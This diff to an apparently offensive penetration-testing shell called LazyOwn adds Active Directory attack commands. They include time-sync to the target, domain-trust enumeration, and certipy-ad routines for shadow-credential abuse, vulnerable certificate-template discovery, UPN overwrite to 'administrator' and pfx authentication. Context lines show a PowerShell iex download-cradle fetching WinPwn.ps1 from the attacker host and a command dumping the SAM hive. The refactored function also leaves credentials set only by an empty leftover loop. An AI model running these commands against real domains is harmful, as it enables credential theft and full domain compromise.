@@ -156,6 +156,8 @@ class LazyOwnShell(cmd2.Cmd):
         "kallsyms": "sh sudo cat /proc/kallsyms",
         "kvpn":"sh sudo killall openvpn",
         "nmap": "run_script \"/home/grisun0/LazyOwn/lazyscripts/lazynmap.ls\"",
+        "ntp" : f"sh sudo ntpdate pool.ntp.org",
+        "ntp_rhost" : f"sh sudo ntpdate {rhost}",
         "now": "clock",
         "notes": "sh nano sessions/notes.txt",
         "p": "payload",
@@ -6204,6 +6206,9 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN domain trust", "nltest /domain_trusts"),
+            ("WIN check relationship", "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"),
+            ("WIN Trust all AD", "Get-ADTrust -Filter *"),
             ("WIN WinPwn", f"iex(new-object net.webclient).downloadstring('https://{lhost}/WinPwn.ps1')"),
             ("WIN Show computers", f"net use \\\\{rhost} \"{start_pass}\" /u:{domain}\\{start_user}"),
             ("WIN Save SAM 2", "C:\\Windows\\System32\\reg.exe save hklm\\sam sam.hive"),
@@ -19089,29 +19094,55 @@ class LazyOwnShell(cmd2.Cmd):
     def do_certipy_ad(self, line):
         target = self.params["rhost"]
         domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
         credentials = get_credentials()
+        for user, passwd in credentials:
+            pass
+
         if not credentials:
             return
         if line.startswith("shadow"):
-            for user, passwd in credentials:
-            
-                username = user
-                password = passwd
-                account = input("    [!] Enter Account for shadow abuse (default WINRM_SVC): ") or 'WINRM_SVC'
-                command = f"certipy-ad shadow auto -u '{username}@{domain}' -p '{password}' -account '{account}' -dc-ip {target}"
-                self.cmd(command)
+            username = user
+            password = passwd
+            account = input("    [!] Enter Account for shadow abuse (default WINRM_SVC): ") or 'WINRM_SVC'
+            command = f"certipy-ad shadow auto -u '{username}@{domain}' -p '{password}' -account '{account}' -dc-ip {target}"
+            self.cmd(command)
+
         elif line.startswith("vuln"):
-            for user, passwd in credentials:
-                hash_content = get_hash()
-                username = user
-                password = passwd
-                account = input("    [!] Enter Account for vulnerable abuse (default CA_SVC): ") or 'CA_SVC'
-                command = f"certipy-ad find -vulnerable -u CA_SVC -hashes \":{hash_content}\" -dc-ip {target}"
-                self.cmd(command)
+            hash_content = get_hash()
+            username = user
+            password = passwd
+            account = input("    [!] Enter Account for vulnerable abuse (default CA_SVC): ") or 'CA_SVC'
+            command = f"certipy-ad find -vulnerable -u {account} -hashes \":{hash_content}\" -dc-ip {target}"
+            self.cmd(command)
+
+        elif line.startswith("find"):
+            hash_content = get_hash()
+            account = input("    [!] Enter Account for find abuse (default CA_SVC): ") or 'CA_SVC'
+            command = f"certipy-ad find -username {account} -hashes :{hash_content} -dc-ip {target} -vulnerable"
+            self.cmd(command)
+
+        elif line.startswith("acount"):
+            
+            account = input("    [!] Enter Account for account abuse (default CA_SVC): ") or 'CA_SVC'
+            command = f"certipy-ad account -u '{user}@{domain}' -p '{passwd}' -dc-ip '{target}' -user '{account}' read"
+            self.cmd(command)
+            upn = input("    [!] Enter Account for upn (default administrator): ") or 'administrator'
+            command = f"certipy-ad account -u '{user}@{domain}' -p '{passwd}' -dc-ip '{target}' -upn '{upn}'  -user '{account}' update"
+            self.cmd(command)
+
+        elif line.startswith("auth"):
+            account = input("    [!] Enter Account for username (default administrator): ") or 'administrator'
+            pfx_file = get_users_dic("pfx")
+            if not pfx_file:
+                return
+            command = f"certipy auth -dc-ip '{target}' -pfx '{pfx_file}' -username '{account}' -domain '{domain}'"
+            self.cmd(command)
+
         else:
             print_error("Enter valid option shadow or vuln")
             return
-            
+        return            
     @cmd2.with_category(scanning_category)
     def do_certipy(self, line):
         """
